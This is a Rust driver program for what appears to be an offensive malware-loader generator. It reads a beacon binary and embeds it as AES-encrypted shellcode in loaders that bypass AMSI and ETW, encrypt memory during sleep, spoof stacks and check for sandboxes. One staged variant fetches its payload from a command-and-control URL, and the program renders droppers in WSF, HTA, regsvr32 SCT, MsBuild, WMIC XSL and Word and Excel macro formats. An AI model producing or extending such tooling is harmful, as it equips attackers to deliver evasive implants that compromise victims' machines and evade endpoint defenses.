use std::fs;
use std::path::PathBuf;
use template_engine::*;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let beacon_path = "/Users/salma/Documents/Research/DefCrow/beacon_x64.bin";
    let beacon_bytes = fs::read(beacon_path)?;
    println!("✓ Loaded {} bytes from {}", beacon_bytes.len(), beacon_path);

    let shellcode_hex: String = beacon_bytes.iter().map(|b| format!("{:02x}", b)).collect();
    let key_hex: String = (0..32).map(|i| format!("{:02x}", (i * 7 + 13) as u8 ^ 0xAB)).collect();
    let iv_hex:  String = (0..16).map(|i| format!("{:02x}", (i * 11 + 5) as u8 ^ 0xCD)).collect();

    println!("Shellcode hex: {} chars", shellcode_hex.len());
    println!("Key hex:       {} chars", key_hex.len());
    println!("IV hex:        {} chars", iv_hex.len());

    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![
            Feature::AmsiHwbp, Feature::EtwHwbp, Feature::SleepEncrypt,
            Feature::StackSpoof, Feature::SandboxUser,
        ],
        encryption: Encryption::Aes256,
        shellcode_hex: shellcode_hex.clone(),
        key_hex,
        iv_hex,
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };

    let stageless_src = generate_loader_source(&config)?;
    println!("\n─── STAGELESS Binary loader source ──");
    println!("  rendered {} bytes of Rust source", stageless_src.len());
    println!("  contains scaffold extern crate:    {}", stageless_src.contains("extern crate scaffold;"));
    println!("  contains decrypt_aes256:           {}", stageless_src.contains("decrypt_aes256"));
    println!("  contains stager::fetch (must NOT): {}", stageless_src.contains("scaffold::stager::fetch"));
    println!("  embeds shellcode hex first 32 chars present: {}", stageless_src.contains(&shellcode_hex[..32]));

    let staged_config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![Feature::AmsiHwbp, Feature::EtwHwbp, Feature::SleepEncrypt],
        encryption: Encryption::Aes256,
        shellcode_hex: "00".into(),
        key_hex: "00".repeat(32),
        iv_hex: "00".repeat(16),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: Some(StagedConfig {
            url:        "https://c2.example.com/api/v1/stage/aabbccddeeff0011".into(),
            jwt:        "eyJhbGciOiJIUzI1NiJ9.eyJwaWQiOiJhYWJiY2NkZGVlZmYwMDExIn0.SIGNATURE".into(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0".into(),
        }),
    };
    let staged_src = generate_loader_source(&staged_config)?;
    println!("\n─── STAGED Binary loader source ──");
    println!("  rendered {} bytes of Rust source", staged_src.len());
    println!("  contains scaffold::stager::fetch:  {}", staged_src.contains("scaffold::stager::fetch"));
    println!("  contains decrypt_aes256 (must NOT):{}", staged_src.contains("decrypt_aes256"));
    println!("  contains plaintext URL  (must NOT):{}", staged_src.contains("c2.example.com"));
    println!("  contains plaintext JWT  (must NOT):{}", staged_src.contains("SIGNATURE"));

    let out_dir = PathBuf::from("/tmp/beacon_test");
    fs::create_dir_all(&out_dir)?;
    fs::write(out_dir.join("stageless.rs"), &stageless_src)?;
    fs::write(out_dir.join("staged.rs"),    &staged_src)?;
    println!("\n✓ Sources written to {}/", out_dir.display());

    let templates = [
        ("WSF",      LoaderType::Wsf),
        ("HTA",      LoaderType::Hta),
        ("SCT",      LoaderType::Regsvr32Sct),
        ("MsBuild",  LoaderType::MsBuild),
        ("WMIC",     LoaderType::WmicXsl),
    ];
    println!("\n─── Multi-loader stageless render (real beacon) ──");
    for (name, lt) in &templates {
        let cfg = LoaderConfig {
            loader_type: *lt,
            features: vec![],
            encryption: Encryption::Aes256,
            shellcode_hex: shellcode_hex.clone(),
            key_hex: "ab".repeat(32),
            iv_hex:  "cd".repeat(16),
            pe_config: None,
            appdomain_config: None,
            wsf_stub_config: Some(WsfStubConfig { namespace: "x".into(), type_name: "y".into() }),
            dotnet_stub_hex: None,
            staged: None,
        };
        let src = generate_script_source(&cfg)?;
        let path = out_dir.join(format!("{}_stageless.txt", name.to_lowercase()));
        fs::write(&path, &src)?;
        println!("  {:8} → {:>7} bytes → {}", name, src.len(), path.display());
    }

    for (name, lt) in &[("VBA Word", LoaderType::DocxMacro), ("VBA Excel", LoaderType::XlsxMacro)] {
        let cfg = LoaderConfig {
            loader_type: *lt,
            features: vec![],
            encryption: Encryption::Aes256,
            shellcode_hex: shellcode_hex.clone(),
            key_hex: "ab".repeat(32),
            iv_hex:  "cd".repeat(16),
            pe_config: None,
            appdomain_config: None,
            wsf_stub_config: None,
            dotnet_stub_hex: None,
            staged: None,
        };
        let src = generate_vba_source(&cfg)?;
        let path = out_dir.join(format!("{}_stageless.bas", name.replace(' ', "_").to_lowercase()));
        fs::write(&path, &src)?;
        println!("  {:8} → {:>7} bytes → {}", name, src.len(), path.display());
    }

    println!("\n✓ ALL renders successful. Beacon ({} bytes) successfully embedded in every loader family.", beacon_bytes.len());
    Ok(())
}
